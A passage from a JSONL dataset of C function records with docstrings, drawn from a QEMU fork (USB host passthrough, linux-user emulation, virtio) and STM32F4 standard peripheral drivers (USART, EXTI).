proxy_sbd->mmio[0].addr);\n    }\n    g_free(proxy_path);\n    return path;\n}", "path": "hw\\virtio\\virtio-mmio.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* Utility function: Table-driven functions to translate bitmasks\n * between host and target formats\n */\n", "func_signal": "unsigned int target_to_host_bitmask(unsigned int target_mask,\n                                    const bitmask_transtbl * trans_tbl)", "code": "{\n    const bitmask_transtbl *btp;\n    unsigned int host_mask = 0;\n\n    for (btp = trans_tbl; btp->target_mask && btp->host_mask; btp++) {\n        if ((target_mask & btp->target_mask) == btp->target_bits) {\n            host_mask |= btp->host_bits;\n        }\n    }\n    return host_mask;\n}", "path": "thunk.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* Make sure everything is in a consistent state for calling fork().  */\n", "func_signal": "void fork_start(void)", "code": "{\n    cpu_list_lock();\n    qemu_mutex_lock(&tcg_ctx.tb_ctx.tb_lock);\n    mmap_fork_start();\n}", "path": "linux-user\\main.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* ------------------------------------------------------------------------ */\n", "func_signal": "static void usb_host_speed_compat(USBHostDevice *s)", "code": "{\n    USBDevice *udev = USB_DEVICE(s);\n    struct libusb_config_descriptor *conf;\n    const struct libusb_interface_descriptor *intf;\n    const struct libusb_endpoint_descriptor *endp;\n#ifdef HAVE_STREAMS\n    struct libusb_ss_endpoint_companion_descriptor *endp_ss_comp;\n#endif\n    bool compat_high = true;\n    bool compat_full = true;\n    uint8_t type;\n    int rc, c, i, a, e;\n\n    for (c = 0;; c++) {\n        rc = libusb_get_config_descriptor(s->dev, c, &conf);\n        if (rc != 0) {\n            break;\n        }\n        for (i = 0; i < conf->bNumInterfaces; i++) {\n            for (a = 0; a < conf->interface[i].num_altsetting; a++) {\n                intf = &conf->interface[i].altsetting[a];\n                for (e = 0; e < intf->bNumEndpoints; e++) {\n                    endp = &intf->endpoint[e];\n                    type = endp->bmAttributes & 0x3;\n                    switch (type) {\n                    case 0x01: /* ISO */\n                        compat_full = false;\n                        compat_high = false;\n                        break;\n                    case 0x02: /* BULK */\n#ifdef HAVE_STREAMS\n                        rc = libusb_get_ss_endpoint_companion_descriptor\n                            (ctx, endp, &endp_ss_comp);\n                        if (rc == LIBUSB_SUCCESS) {\n                            int streams = endp_ss_comp->bmAttributes & 0x1f;\n                            if (streams) {\n                                compat_full = false;\n                                compat_high = false;\n                            }\n                            libusb_free_ss_endpoint_companion_descriptor\n                                (endp_ss_comp);\n                        }\n#endif\n                        break;\n                    case 0x03: /* INTERRUPT */\n                        if (endp->wMaxPacketSize > 64) {\n                            compat_full = false;\n                        }\n                        if (endp->wMaxPacketSize > 1024) {\n                            compat_high = false;\n                        }\n                        break;\n                    }\n                }\n            }\n        }\n        libusb_free_config_descriptor(conf);\n    }\n\n    udev->speedmask = (1 << udev->speed);\n    if (udev->speed == USB_SPEED_SUPER && compat_high) {\n        udev->speedmask |= USB_SPEED_MASK_HIGH;\n    }\n    if (udev->speed == USB_SPEED_SUPER && compat_full) {\n        udev->speedmask |= USB_SPEED_MASK_FULL;\n    }\n    if (udev->speed == USB_SPEED_HIGH && compat_full) {\n        udev->speedmask |= USB_SPEED_MASK_FULL;\n    }\n}", "path": "hw\\usb\\host-libusb.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* save the register window 'cwp1' */\n", "func_signal": "static inline void save_window_offset(CPUSPARCState *env, int cwp1)", "code": "{\n    unsigned int i;\n    abi_ulong sp_ptr;\n\n    sp_ptr = env->regbase[get_reg_index(env, cwp1, 6)];\n#ifdef TARGET_SPARC64\n    if (sp_ptr & 3)\n        sp_ptr += SPARC64_STACK_BIAS;\n#endif\n#if defined(DEBUG_WIN)\n    printf(\"win_overflow: sp_ptr=0x\" TARGET_ABI_FMT_lx \" save_cwp=%d\\n\",\n           sp_ptr, cwp1);\n#endif\n    for(i = 0; i < 16; i++) {\n        /* FIXME - what to do if put_user() fails? */\n        put_user_ual(env->regbase[get_reg_index(env, cwp1, 8 + i)], sp_ptr);\n        sp_ptr += sizeof(abi_ulong);\n    }\n}", "path": "linux-user\\main.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* WARNING: dealing with register windows _is_ complicated. More info\n   can be found at http://www.sics.se/~psm/sparcstack.html */\n", "func_signal": "static inline int get_reg_index(CPUSPARCState *env, int cwp, int index)", "code": "{\n    index = (index + cwp * 16) % (16 * env->nwindows);\n    /* wrap handling : if cwp is on the last window, then we use the\n       registers 'after' the end */\n    if (index < 8 && env->cwp == env->nwindows - 1)\n        index += 16 * env->nwindows;\n    return index;\n}", "path": "linux-user\\main.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/*\n * This is *NOT* about restoring state.  We have absolutely no idea\n * what state the host device is in at the moment and whenever it is\n * still present in the first place.  Attemping to contine where we\n * left off is impossible.\n *\n * What we are going to do here is emulate a surprise removal of\n * the usb device passed through, then kick host scan so the device\n * will get re-attached (and re-initialized by the guest) in case it\n * is still present.\n *\n * As the device removal will change the state of other devices (usb\n * host controller, most likely interrupt controller too) we have to\n * wait with it until *all* vmstate is loaded.  Thus post_load just\n * kicks a bottom half which then does the actual work.\n */\n", "func_signal": "static void usb_host_post_load_bh(void *opaque)", "code": "{\n    USBHostDevice *dev = opaque;\n    USBDevice *udev = USB_DEVICE(dev);\n\n    if (dev->dh != NULL) {\n        usb_host_close(dev);\n    }\n    if (udev->attached) {\n        usb_device_detach(udev);\n    }\n    usb_host_auto_check(NULL);\n}", "path": "hw\\usb\\host-libusb.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* ------------------------------------------------------------------------ */\n", "func_signal": "static bool usb_host_use_combining(USBEndpoint *ep)", "code": "{\n    int type;\n\n    if (!ep->pipeline) {\n        return false;\n    }\n    if (ep->pid != USB_TOKEN_IN) {\n        return false;\n    }\n    type = usb_ep_get_type(ep->dev, ep->pid, ep->nr);\n    if (type != USB_ENDPOINT_XFER_BULK) {\n        return false;\n    }\n    return true;\n}", "path": "hw\\usb\\host-libusb.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/**\n * Check whether USB host device has a USB mass storage SCSI interface\n */\n", "func_signal": "bool usb_host_dev_is_scsi_storage(USBDevice *ud)", "code": "{\n    USBHostDevice *uhd = USB_HOST_DEVICE(ud);\n    struct libusb_config_descriptor *conf;\n    const struct libusb_interface_descriptor *intf;\n    bool is_scsi_storage = false;\n    int i;\n\n    if (!uhd || libusb_get_active_config_descriptor(uhd->dev, &conf) != 0) {\n        return false;\n    }\n\n    for (i = 0; i < conf->bNumInterfaces; i++) {\n        intf = &conf->interface[i].altsetting[ud->altsetting[i]];\n        if (intf->bInterfaceClass == LIBUSB_CLASS_MASS_STORAGE &&\n            intf->bInterfaceSubClass == 6) {                 /* 6 means SCSI */\n            is_scsi_storage = true;\n            break;\n        }\n    }\n\n    libusb_free_config_descriptor(conf);\n\n    return is_scsi_storage;\n}", "path": "hw\\usb\\host-libusb.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* !CONFIG_WIN32 */\n", "func_signal": "static int usb_host_init(void)", "code": "{\n#ifndef CONFIG_WIN32\n    const struct libusb_pollfd **poll;\n#endif\n    int rc;\n\n    if (ctx) {\n        return 0;\n    }\n    rc = libusb_init(&ctx);\n    if (rc != 0) {\n        return -1;\n    }\n    libusb_set_debug(ctx, loglevel);\n#ifdef CONFIG_WIN32\n    /* FIXME: add support for Windows. */\n#else\n    libusb_set_pollfd_notifiers(ctx, usb_host_add_fd,\n                                usb_host_del_fd,\n                                ctx);\n    poll = libusb_get_pollfds(ctx);\n    if (poll) {\n        int i;\n        for (i = 0; poll[i] != NULL; i++) {\n            usb_host_add_fd(poll[i]->fd, poll[i]->events, ctx);\n        }\n    }\n    free(poll);\n#endif\n    return 0;\n}", "path": "hw\\usb\\host-libusb.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* Handle a jump to the kernel code page.  */\n", "func_signal": "static int\ndo_kernel_trap(CPUARMState *env)", "code": "{\n    uint32_t addr;\n    uint32_t cpsr;\n    uint32_t val;\n\n    switch (env->regs[15]) {\n    case 0xffff0fa0: /* __kernel_memory_barrier */\n        /* ??? No-op. Will need to do better for SMP.  */\n        break;\n    case 0xffff0fc0: /* __kernel_cmpxchg */\n         /* XXX: This only works between threads, not between processes.\n            It's probably possible to implement this with native host\n            operations. However things like ldrex/strex are much harder so\n            there's not much point trying.  */\n        start_exclusive();\n        cpsr = cpsr_read(env);\n        addr = env->regs[2];\n        /* FIXME: This should SEGV if the access fails.  */\n        if (get_user_u32(val, addr))\n            val = ~env->regs[0];\n        if (val == env->regs[0]) {\n            val = env->regs[1];\n            /* FIXME: Check for segfaults.  */\n            put_user_u32(val, addr);\n            env->regs[0] = 0;\n            cpsr |= CPSR_C;\n        } else {\n            env->regs[0] = -1;\n            cpsr &= ~CPSR_C;\n        }\n        cpsr_write(env, cpsr, CPSR_C, CPSRWriteByInstr);\n        end_exclusive();\n        break;\n    case 0xffff0fe0: /* __kernel_get_tls */\n        env->regs[0] = cpu_get_tls(env);\n        break;\n    case 0xffff0f60: /* __kernel_cmpxchg64 */\n        arm_kernel_cmpxchg64_helper(env);\n        break;\n\n    default:\n        return 1;\n    }\n    /* Jump back to the caller.  */\n    addr = env->regs[14];\n    if (addr & 1) {\n        env->thumb = 1;\n        addr &= ~1;\n    }\n    env->regs[15] = addr;\n\n    return 0;\n}", "path": "linux-user\\main.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* ------------------------------------------------------------------------ */\n", "func_signal": "static USBHostRequest *usb_host_req_alloc(USBHostDevice *s, USBPacket *p,\n                                          bool in, size_t bufsize)", "code": "{\n    USBHostRequest *r = g_new0(USBHostRequest, 1);\n\n    r->host = s;\n    r->p = p;\n    r->in = in;\n    r->xfer = libusb_alloc_transfer(0);\n    if (bufsize) {\n        r->buffer = g_malloc(bufsize);\n    }\n    QTAILQ_INSERT_TAIL(&s->requests, r, next);\n    return r;\n}", "path": "hw\\usb\\host-libusb.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/* Readiness of the guest to accept data on a port */\n", "func_signal": "static int chr_can_read(void *opaque)", "code": "{\n    VirtConsole *vcon = opaque;\n\n    return virtio_serial_guest_ready(VIRTIO_SERIAL_PORT(vcon));\n}", "path": "hw\\char\\virtio-console.c", "repo_name": "Comsecuris/luaqemu", "stars": 134, "license": "other", "language": "c", "size": 105774}
{"docstring": "/**\n  * @brief  Enables or disables the USART's Smart Card mode.\n  * @param  USARTx: where x can be 1, 2, 3 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  NewState: new state of the Smart Card mode.\n  *          This parameter can be: ENABLE or DISABLE.      \n  * @retval None\n  */\n", "func_signal": "void USART_SmartCardCmd(USART_TypeDef* USARTx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_1236_PERIPH(USARTx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the SC mode by setting the SCEN bit in the CR3 register */\n    USARTx->CR3 |= USART_CR3_SCEN;\n  }\n  else\n  {\n    /* Disable the SC mode by clearing the SCEN bit in the CR3 register */\n    USARTx->CR3 &= (uint16_t)~((uint16_t)USART_CR3_SCEN);\n  }\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Fills each EXTI_InitStruct member with its reset value.\n  * @param  EXTI_InitStruct: pointer to a EXTI_InitTypeDef structure which will\n  *         be initialized.\n  * @retval None\n  */\n", "func_signal": "void EXTI_StructInit(EXTI_InitTypeDef* EXTI_InitStruct)", "code": "{\n  EXTI_InitStruct->EXTI_Line = EXTI_LINENONE;\n  EXTI_InitStruct->EXTI_Mode = EXTI_Mode_Interrupt;\n  EXTI_InitStruct->EXTI_Trigger = EXTI_Trigger_Falling;\n  EXTI_InitStruct->EXTI_LineCmd = DISABLE;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_exti.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Enables or disables NACK transmission.\n  * @param  USARTx: where x can be 1, 2, 3 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  NewState: new state of the NACK transmission.\n  *          This parameter can be: ENABLE or DISABLE.  \n  * @retval None\n  */\n", "func_signal": "void USART_SmartCardNACKCmd(USART_TypeDef* USARTx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_1236_PERIPH(USARTx)); \n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the NACK transmission by setting the NACK bit in the CR3 register */\n    USARTx->CR3 |= USART_CR3_NACK;\n  }\n  else\n  {\n    /* Disable the NACK transmission by clearing the NACK bit in the CR3 register */\n    USARTx->CR3 &= (uint16_t)~((uint16_t)USART_CR3_NACK);\n  }\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Enables or disables the USART's LIN mode.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  NewState: new state of the USART LIN mode.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void USART_LINCmd(USART_TypeDef* USARTx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the LIN mode by setting the LINEN bit in the CR2 register */\n    USARTx->CR2 |= USART_CR2_LINEN;\n  }\n  else\n  {\n    /* Disable the LIN mode by clearing the LINEN bit in the CR2 register */\n    USARTx->CR2 &= (uint16_t)~((uint16_t)USART_CR2_LINEN);\n  }\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Clears the EXTI's line pending bits.\n  * @param  EXTI_Line: specifies the EXTI lines to clear.\n  *          This parameter can be any combination of EXTI_Linex where x can be (0..22)\n  * @retval None\n  */\n", "func_signal": "void EXTI_ClearITPendingBit(uint32_t EXTI_Line)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_EXTI_LINE(EXTI_Line));\n  \n  EXTI->PR = EXTI_Line;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_exti.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Transmits break characters.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @retval None\n  */\n", "func_signal": "void USART_SendBreak(USART_TypeDef* USARTx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  \n  /* Send break characters */\n  USARTx->CR1 |= USART_CR1_SBK;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Returns the most recent received data by the USARTx peripheral.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @retval The received data.\n  */\n", "func_signal": "uint16_t USART_ReceiveData(USART_TypeDef* USARTx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  \n  /* Receive Data */\n  return (uint16_t)(USARTx->DR & (uint16_t)0x01FF);\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Fills each USART_ClockInitStruct member with its default value.\n  * @param  USART_ClockInitStruct: pointer to a USART_ClockInitTypeDef structure\n  *         which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void USART_ClockStructInit(USART_ClockInitTypeDef* USART_ClockInitStruct)", "code": "{\n  /* USART_ClockInitStruct members default value */\n  USART_ClockInitStruct->USART_Clock = USART_Clock_Disable;\n  USART_ClockInitStruct->USART_CPOL = USART_CPOL_Low;\n  USART_ClockInitStruct->USART_CPHA = USART_CPHA_1Edge;\n  USART_ClockInitStruct->USART_LastBit = USART_LastBit_Disable;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Enables or disables the USART's one bit sampling method.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  NewState: new state of the USART one bit sampling method.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void USART_OneBitMethodCmd(USART_TypeDef* USARTx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the one bit method by setting the ONEBITE bit in the CR3 register */\n    USARTx->CR3 |= USART_CR3_ONEBIT;\n  }\n  else\n  {\n    /* Disable the one bit method by clearing the ONEBITE bit in the CR3 register */\n    USARTx->CR3 &= (uint16_t)~((uint16_t)USART_CR3_ONEBIT);\n  }\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Generates a Software interrupt on selected EXTI line.\n  * @param  EXTI_Line: specifies the EXTI line on which the software interrupt\n  *         will be generated.\n  *         This parameter can be any combination of EXTI_Linex where x can be (0..22)\n  * @retval None\n  */\n", "func_signal": "void EXTI_GenerateSWInterrupt(uint32_t EXTI_Line)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_EXTI_LINE(EXTI_Line));\n  \n  EXTI->SWIER |= EXTI_Line;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_exti.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Enables or disables the USART's IrDA interface.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  NewState: new state of the IrDA mode.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void USART_IrDACmd(USART_TypeDef* USARTx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n    \n  if (NewState != DISABLE)\n  {\n    /* Enable the IrDA mode by setting the IREN bit in the CR3 register */\n    USARTx->CR3 |= USART_CR3_IREN;\n  }\n  else\n  {\n    /* Disable the IrDA mode by clearing the IREN bit in the CR3 register */\n    USARTx->CR3 &= (uint16_t)~((uint16_t)USART_CR3_IREN);\n  }\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Sets the system clock prescaler.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  USART_Prescaler: specifies the prescaler clock. \n  * @note   The function is used for IrDA mode with UART4 and UART5.   \n  * @retval None\n  */\n", "func_signal": "void USART_SetPrescaler(USART_TypeDef* USARTx, uint8_t USART_Prescaler)", "code": "{ \n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  \n  /* Clear the USART prescaler */\n  USARTx->GTPR &= USART_GTPR_GT;\n  /* Set the USART prescaler */\n  USARTx->GTPR |= USART_Prescaler;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Initializes the USARTx peripheral according to the specified\n  *         parameters in the USART_InitStruct .\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  USART_InitStruct: pointer to a USART_InitTypeDef structure that contains\n  *         the configuration information for the specified USART peripheral.\n  * @retval None\n  */\n", "func_signal": "void USART_Init(USART_TypeDef* USARTx, USART_InitTypeDef* USART_InitStruct)", "code": "{\n  uint32_t tmpreg = 0x00, apbclock = 0x00;\n  uint32_t integerdivider = 0x00;\n  uint32_t fractionaldivider = 0x00;\n  RCC_ClocksTypeDef RCC_ClocksStatus;\n\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  assert_param(IS_USART_BAUDRATE(USART_InitStruct->USART_BaudRate));  \n  assert_param(IS_USART_WORD_LENGTH(USART_InitStruct->USART_WordLength));\n  assert_param(IS_USART_STOPBITS(USART_InitStruct->USART_StopBits));\n  assert_param(IS_USART_PARITY(USART_InitStruct->USART_Parity));\n  assert_param(IS_USART_MODE(USART_InitStruct->USART_Mode));\n  assert_param(IS_USART_HARDWARE_FLOW_CONTROL(USART_InitStruct->USART_HardwareFlowControl));\n\n  /* The hardware flow control is available only for USART1, USART2, USART3 and USART6 */\n  if (USART_InitStruct->USART_HardwareFlowControl != USART_HardwareFlowControl_None)\n  {\n    assert_param(IS_USART_1236_PERIPH(USARTx));\n  }\n\n/*---------------------------- USART CR2 Configuration -----------------------*/\n  tmpreg = USARTx->CR2;\n\n  /* Clear STOP[13:12] bits */\n  tmpreg &= (uint32_t)~((uint32_t)USART_CR2_STOP);\n\n  /* Configure the USART Stop Bits, Clock, CPOL, CPHA and LastBit :\n      Set STOP[13:12] bits according to USART_StopBits value */\n  tmpreg |= (uint32_t)USART_InitStruct->USART_StopBits;\n  \n  /* Write to USART CR2 */\n  USARTx->CR2 = (uint16_t)tmpreg;\n\n/*---------------------------- USART CR1 Configuration -----------------------*/\n  tmpreg = USARTx->CR1;\n\n  /* Clear M, PCE, PS, TE and RE bits */\n  tmpreg &= (uint32_t)~((uint32_t)CR1_CLEAR_MASK);\n\n  /* Configure the USART Word Length, Parity and mode: \n     Set the M bits according to USART_WordLength value \n     Set PCE and PS bits according to USART_Parity value\n     Set TE and RE bits according to USART_Mode value */\n  tmpreg |= (uint32_t)USART_InitStruct->USART_WordLength | USART_InitStruct->USART_Parity |\n            USART_InitStruct->USART_Mode;\n\n  /* Write to USART CR1 */\n  USARTx->CR1 = (uint16_t)tmpreg;\n\n/*---------------------------- USART CR3 Configuration -----------------------*/  \n  tmpreg = USARTx->CR3;\n\n  /* Clear CTSE and RTSE bits */\n  tmpreg &= (uint32_t)~((uint32_t)CR3_CLEAR_MASK);\n\n  /* Configure the USART HFC : \n      Set CTSE and RTSE bits according to USART_HardwareFlowControl value */\n  tmpreg |= USART_InitStruct->USART_HardwareFlowControl;\n\n  /* Write to USART CR3 */\n  USARTx->CR3 = (uint16_t)tmpreg;\n\n/*---------------------------- USART BRR Configuration -----------------------*/\n  /* Configure the USART Baud Rate */\n  RCC_GetClocksFreq(&RCC_ClocksStatus);\n\n  if ((USARTx == USART1) || (USARTx == USART6))\n  {\n    apbclock = RCC_ClocksStatus.PCLK2_Frequency;\n  }\n  else\n  {\n    apbclock = RCC_ClocksStatus.PCLK1_Frequency;\n  }\n  \n  /* Determine the integer part */\n  if ((USARTx->CR1 & USART_CR1_OVER8) != 0)\n  {\n    /* Integer part computing in case Oversampling mode is 8 Samples */\n    integerdivider = ((25 * apbclock) / (2 * (USART_InitStruct->USART_BaudRate)));    \n  }\n  else /* if ((USARTx->CR1 & USART_CR1_OVER8) == 0) */\n  {\n    /* Integer part computing in case Oversampling mode is 16 Samples */\n    integerdivider = ((25 * apbclock) / (4 * (USART_InitStruct->USART_BaudRate)));    \n  }\n  tmpreg = (integerdivider / 100) << 4;\n\n  /* Determine the fractional part */\n  fractionaldivider = integerdivider - (100 * (tmpreg >> 4));\n\n  /* Implement the fractional part in the register */\n  if ((USARTx->CR1 & USART_CR1_OVER8) != 0)\n  {\n    tmpreg |= ((((fractionaldivider * 8) + 50) / 100)) & ((uint8_t)0x07);\n  }\n  else /* if ((USARTx->CR1 & USART_CR1_OVER8) == 0) */\n  {\n    tmpreg |= ((((fractionaldivider * 16) + 50) / 100)) & ((uint8_t)0x0F);\n  }\n  \n  /* Write to USART BRR register */\n  USARTx->BRR = (uint16_t)tmpreg;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Checks whether the specified EXTI line is asserted or not.\n  * @param  EXTI_Line: specifies the EXTI line to check.\n  *          This parameter can be EXTI_Linex where x can be(0..22)\n  * @retval The new state of EXTI_Line (SET or RESET).\n  */\n", "func_signal": "ITStatus EXTI_GetITStatus(uint32_t EXTI_Line)", "code": "{\n  ITStatus bitstatus = RESET;\n  uint32_t enablestatus = 0;\n  /* Check the parameters */\n  assert_param(IS_GET_EXTI_LINE(EXTI_Line));\n  \n  enablestatus =  EXTI->IMR & EXTI_Line;\n  if (((EXTI->PR & EXTI_Line) != (uint32_t)RESET) && (enablestatus != (uint32_t)RESET))\n  {\n    bitstatus = SET;\n  }\n  else\n  {\n    bitstatus = RESET;\n  }\n  return bitstatus;\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_exti.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Enables or disables the specified USART peripheral.\n  * @param  USARTx: where x can be 1, 2, 3, 4, 5 or 6 to select the USART or \n  *         UART peripheral.\n  * @param  NewState: new state of the USARTx peripheral.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void USART_Cmd(USART_TypeDef* USARTx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_USART_ALL_PERIPH(USARTx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the selected USART by setting the UE bit in the CR1 register */\n    USARTx->CR1 |= USART_CR1_UE;\n  }\n  else\n  {\n    /* Disable the selected USART by clearing the UE bit in the CR1 register */\n    USARTx->CR1 &= (uint16_t)~((uint16_t)USART_CR1_UE);\n  }\n}", "path": "Software\\StdPeriph_Driver\\src\\stm32f4xx_usart.c", "repo_name": "zephray/NekoCal", "stars": 181, "license": "None", "language": "c", "size": 40121}
{"docstring": "/**\n  * @brief  Initializes the EXTI peripheral according to the specified\n  *         parameters in the EXTI_InitStruct.\n  * @param  EXTI_InitStruct: pointer to a EXTI_InitTypeDef structure\n  *         that contains the configuration information for the EXTI peripheral.\n  * @retval None\n  */\n", "func_signal": "void EXTI_Init(EXTI_InitTypeDef* EXTI_InitStruct)", "code": "{\n  uint32_t tmp = 0;\n\n  /* Check the parameters */\n  assert_param(IS_EXTI_MODE(EXTI_InitStruct->EXTI_Mode));\n  assert_param(IS_EXTI_TRIGGER(EXTI_InitStruct->EXTI_Trigger));\n  assert_param(IS_EXTI_LINE(EXTI_InitStruct->EXTI_Line));  \n  assert_param(IS_FUNCTIONAL_STATE(EXTI_InitStruct->EXTI_LineCmd));\n\n  tmp = (uint32_t)EXTI_BASE;\n     \n  if (EXTI_InitStruct->EXTI_LineCmd != DISABLE)\n  {\n    /* Clear EXTI line configuration */\n    EXTI->IMR &= ~EXTI_InitStruct->EXTI_Line;\n    EXTI->EMR &= ~EXTI_InitStruct->EXTI_Line;\n    \n    tmp += EXTI_InitStruct->EXTI_Mode;\n\n    *(__IO uint32_t *) tmp |= EXTI_InitStruct->EXTI_Line;\n\n    /* Clear Rising Falling edge configuration */\n    EXTI->RTSR &= ~EXTI_InitStruct->EXTI_Line;\n    EXTI->FTSR &= ~EXTI_InitStruct->EXTI_Line;\n    \n    /* Select the trigger for the selected external interrupts */\n    if (EXTI_InitStruct->EXTI_Trigger == EXTI_Trigger_Rising_Falling)\n    {\n      /* Rising Falling edge */\n      EXTI->RTSR |= EXTI_InitStruct->EXTI_Line;\n      EXTI->FTSR |= EXTI_InitStruct->EXTI_Line;\n    }\n    else\n    {\n      tmp = (uint32_t)EXTI_BASE;\n      tmp += EXTI_InitStruct->EXTI_Trigger;\n\n      *(__IO uint32_t *) tmp |= EXTI_InitStruct->EXTI_Line;\n    }\n  }\n  else\n  {\n    tmp += EXTI_InitStruct->EXTI_Mode;\n\n    /* Disable the selected external lines */\n    *(__IO uint32_t *) tmp &= ~EXTI_InitStruct->EXTI_Line;\n  }\n}", "path": 